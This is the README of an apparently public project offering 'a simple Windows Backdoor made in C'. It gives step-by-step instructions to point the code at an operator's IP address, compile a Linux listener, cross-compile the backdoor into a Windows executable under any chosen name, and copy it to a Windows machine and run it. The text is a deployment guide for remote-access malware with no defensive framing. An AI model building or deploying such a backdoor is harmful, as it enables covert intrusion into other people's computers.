# Backdoor
A simple Windows Backdoor made in C

# Usage
## Make sure to change the IP Addr in server.c line 29 and backdoor.c line 143

# How to Download
## Load all the files on Linux and run the following commands
`gcc server.c -o server`

`i686-w64-mingw32-gcc -o nameYouWant.exe backdoor.c -lwsock32 -lwininet`

## If u receive an error running `i686-w64-mingw32-gcc -o nameYouWant.exe backdoor.c -lwsock32 -lwininet` u have to install it and then retry
`apt-get install gcc-mingw-w64-i686`

## Then u have to run the server using and load the .exe on a Windows Machine trough sftp using Filezilla or BitVise and start it
`./server`

